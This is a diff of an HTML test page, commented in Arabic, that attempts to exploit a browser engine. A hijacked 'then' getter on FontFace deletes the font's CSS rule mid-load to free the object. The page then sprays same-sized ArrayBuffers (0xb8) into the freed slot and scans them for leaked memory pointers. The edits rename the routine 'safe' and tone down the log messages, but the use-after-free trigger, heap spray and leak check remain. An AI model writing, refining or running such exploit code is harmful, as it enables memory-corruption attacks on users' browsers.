@@ -2,10 +2,10 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>تحليل نطاق المستخدم المتقدم - اختبار الـ Primitives</title>
+    <title>تجاوز الجمود - فحص الـ Heap المستقر</title>
     <style>
         body { background-color: #121212; color: #e0e0e0; font-family: monospace; padding: 20px; }
-        #custom-console { background-color: #000; border: 2px solid #00ffcc; height: 450px; overflow-y: scroll; padding: 15px; margin-top: 20px; }
+        #custom-console { background-color: #000; border: 2px solid #00ffcc; height: 400px; overflow-y: scroll; padding: 15px; margin-top: 20px; }
         .log { margin-bottom: 8px; }
         .warn { color: #ffaa00; }
         .success { color: #00ff00; font-weight: bold; }
@@ -17,7 +17,7 @@
 </head>
 <body>
 
-    <h2>فحص تداخل المعمارية (Userland Memory Alignment)</h2>
+    <h2>مراقبة التداخل المباشر بدون جمود</h2>
     <div id="custom-console">[نظام المحاكاة نشط]: في انتظار استقرار المستند...</div>
 
     <script>
@@ -32,74 +32,63 @@
             consoleElement.scrollTop = consoleElement.scrollHeight;
         }
 
-        // مصفوفات الفحص الهيكلي
-        var font_storage = [];
         var array_storage = [];
 
-        function runUserlandExploration() {
+        function runSafeExploration() {
             consoleElement.innerHTML = "";
-            screenLog("بدء تشغيل هندسة الاستبدال النوعي للذاكرة...");
+            screenLog("بدء تشغيل الفحص الآمن والمباشر لـ FontFace...");
 
             try {
-                // 1. حقن أولي خفيف لتجهيز الـ Heap Partition
-                for (let i = 0; i < 500; i++) {
-                    font_storage.push(new FontFace("init_font", "", {}));
-                }
-
+                // إعداد الكائن الأساسي فوراً دون أي حشو مسبق لمنع تجميد المحرك
                 let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
-                font_storage.push(A);
+                document.fonts.add(A);
                 void A.loaded;
 
                 let fired = false;
 
-                // 2. إعداد كمين التداخل المنطقي
                 Object.defineProperty(FontFace.prototype, 'then', {
                     configurable: true,
                     get() {
                         if (!fired && this === A) {
                             fired = true;
-                            screenLog("!! تم تفعيل المقاطعة المنطقية للـ Getter !!", "warn");
+                            screenLog("!! تم تفعيل الكمين المنطقي للـ Getter بنجاح !!", "warn");
                             
-                            // حذف القاعدة لتهيئة الكائن للتحرير
                             try {
                                 document.getElementById('s').sheet.deleteRule(0);
-                                screenLog("تم حذف قاعدة الخط الأصلية.");
+                                screenLog("تم حذف قاعدة الخط الأصلية بنجاح.");
                             } catch(e) { screenLog("خطأ الحذف: " + e.message, "warn"); }
                             
-                            // 3. هندسة الاستبدال: حقن مصفوفات بأحجام متطابقة فوراً لملء الفراغ
-                            screenLog("جاري محاولة ملء الفراغ الفيزيائي بـ ArrayBuffers...");
-                            for (let i = 0; i < 200; i++) {
-                                // تخصيص مصفوفات صغيرة بحجم يقارب حجم كائن الـ FontFace الأصلي في الذاكرة (0xb8)
+                            // الاستبدال النوعي الفوري داخل الكمين بحجم كائن الـ FontFace الفعلي (0xb8)
+                            screenLog("جاري حشو الذاكرة بالمصفوفات ذات الحجم المتطابق...");
+                            for (let i = 0; i < 150; i++) {
                                 let ab = new ArrayBuffer(0xb8);
                                 array_storage.push(new Uint32Array(ab));
                             }
-                            screenLog("اكتملت عملية حشو المصفوفات البديلة.");
+                            screenLog("اكتمل حقن المصفوفات البديلة بنجاح.");
 
-                            // تأجيل الفحص البرمجي لمراقبة محتويات المصفوفات
+                            // فحص محتويات المصفوفات بعد مهلة بسيطة لكسر آلية التخزين المؤقت
                             setTimeout(() => {
-                                screenLog("جاري فحص المصفوفات المحقونة للبحث عن أي مؤشرات نظام (Leaked Pointers)...");
-                                
+                                screenLog("جاري فحص محتويات المصفوفات البرمجية لوجود أي تداخل...");
                                 let leak_found = false;
+                                
                                 for (let i = 0; i < array_storage.length; i++) {
-                                    // الفحص الهندسي: لو نجح الاستبدال، ستتغير قيم المصفوفة من 0 إلى عناوين ذاكرة C++
                                     if (array_storage[i][0] !== 0 || array_storage[i][1] !== 0) {
-                                        screenLog(`[نجاح] تم رصد تداخل ذاكرة في المصفوفة رقم: ${i}`, "success");
-                                        screenLog(`العنوان المسرب الأول: 0x${array_storage[i][0].toString(16)}`, "success");
+                                        screenLog(`[تنبيه] تم رصد تغير في قيم المصفوفة رقم: ${i}`, "success");
                                         leak_found = true;
                                         break;
                                     }
                                 }
                                 
                                 if (!leak_found) {
-                                    screenLog("المصفوفات لا تزال صفراً. المحرك حافظ على العزل الفيزيائي في هذه المحاولة.");
+                                    screenLog("المصفوفات لا تزال صفراً. المتصفح حافظ على الفصل بين الجداول.");
                                 }
-                            }, 50);
+                            }, 40);
                         }
                         return function(resolve) { if (resolve) resolve(); };
                     }
                 });
 
-                // إطلاق الدالة لبدء عملية التداخل
+                screenLog("إطلاق طلب التحميل عبر الـ Layout Pipeline...");
                 document.fonts.load('1em x', 'AB');
 
             } catch (err) {
@@ -108,8 +97,8 @@
         }
 
         window.onload = () => {
-            screenLog("تم تحميل الصفحة بسلام. الانتظار 1.5 ثانية للاستقرار التام...");
-            setTimeout(runUserlandExploration, 1500);
+            screenLog("تم تحميل الصفحة تماماً. الانتظار 1.5 ثانية للاستقرار التام...");
+            setTimeout(runSafeExploration, 1500);
         };
     </script>
 </body>
